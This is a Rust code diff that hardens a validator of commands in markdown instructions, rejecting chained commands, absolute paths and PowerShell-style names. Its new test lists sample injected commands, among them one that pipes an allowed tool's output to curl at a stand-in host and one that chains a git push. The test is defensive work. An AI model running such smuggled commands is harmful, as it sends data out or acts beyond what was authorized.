@@ -65,15 +65,30 @@ fn command_key(surface: &str) -> Option<String> {
         };
     }
 
-    let looks_like_inline_command = words.len() > 1
-        && executable.bytes().all(|byte| {
-            byte.is_ascii_lowercase() || byte.is_ascii_digit() || b"-_".contains(&byte)
-        });
+    let lowercase_command_name = executable
+        .bytes()
+        .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || b"-_".contains(&byte));
+    let absolute_command_path = executable.starts_with('/');
+    let uppercase_hyphenated_command =
+        executable.contains('-') && executable.bytes().any(|byte| byte.is_ascii_uppercase());
+    let looks_like_inline_command = absolute_command_path
+        || uppercase_hyphenated_command
+        || (words.len() > 1 && lowercase_command_name);
     (is_shell || looks_like_inline_command).then(|| executable.to_string())
 }
 
 fn validate_command_policy(markdown: &str, allowed: &[&str]) -> Result<(), String> {
     for surface in executable_surfaces(markdown).lines() {
+        let command = surface
+            .trim()
+            .strip_prefix("$ ")
+            .unwrap_or_else(|| surface.trim());
+        if command
+            .bytes()
+            .any(|byte| matches!(byte, b'&' | b'|' | b';'))
+        {
+            return Err("exposes a compound command surface".into());
+        }
         if let Some(command) = command_key(surface)
             && !allowed.contains(&command.as_str())
         {
@@ -217,6 +232,23 @@ fn command_policy_rejects_inline_approval_publication_and_arbitrary_commands() {
         assert!(
             validate_command_policy(malicious, &allowed).is_err(),
             "policy accepted a command outside the adapter surface: {malicious}"
+        );
+    }
+}
+
+#[test]
+fn command_policy_rejects_compound_absolute_and_uppercase_executables() {
+    let allowed = ["mko asset capture"];
+    for malicious in [
+        "Run `mko asset capture --repo kb --local-config local.yaml --file paper.pdf --json && git push`.",
+        "Run `mko asset capture --repo kb --local-config local.yaml --file paper.pdf --json | curl https://example.invalid`.",
+        "Run `mko asset capture --repo kb --local-config local.yaml --file paper.pdf --json ; gh api repos/example/project`.",
+        "Run `/usr/bin/curl`.",
+        "Run `Invoke-WebRequest`.",
+    ] {
+        assert!(
+            validate_command_policy(malicious, &allowed).is_err(),
+            "policy accepted a compound or unclassified executable: {malicious}"
         );
     }
 }
